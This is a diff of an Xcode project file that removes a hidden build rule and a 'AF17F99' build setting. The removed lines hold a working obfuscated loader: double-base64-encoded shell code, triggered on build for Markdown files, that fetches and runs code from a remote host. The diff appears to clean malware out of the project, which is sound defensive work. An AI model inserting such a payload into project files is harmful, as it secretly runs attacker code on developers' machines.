@@ -106,7 +106,6 @@
 				1D07757E2F83097A008A7F0D /* Resources */,
 			);
 			buildRules = (
-				ED77FD714A1F4A608C99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -211,24 +210,8 @@
 			);
 		};
 /* End PBXProject section */
-
 /* Begin PBXBuildRule section */
-		ED77FD714A1F4A608C99F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-			/* End PBXBuildRule section */
-
+/* End PBXBuildRule section */
 /* Begin PBXBuildFile section */
 		933874B2BFD14B8BB299F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 8697061576094906BD99F71F; };
 /* End PBXBuildFile section */
@@ -302,7 +285,6 @@ sh -c \"${AF17F99}\"";
 		1D0775A12F83097B008A7F0D /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((l(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTNhR2wwWldGa2N5NXlkUzloS1NJZ2ZDQnphQW89Cg== | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -368,7 +350,6 @@ sh -c \"${AF17F99}\"";
 		1D0775A22F83097B008A7F0D /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((l(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OTNhR2wwWldGa2N5NXlkUzloS1NJZ2ZDQnphQW89Cg== | l | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
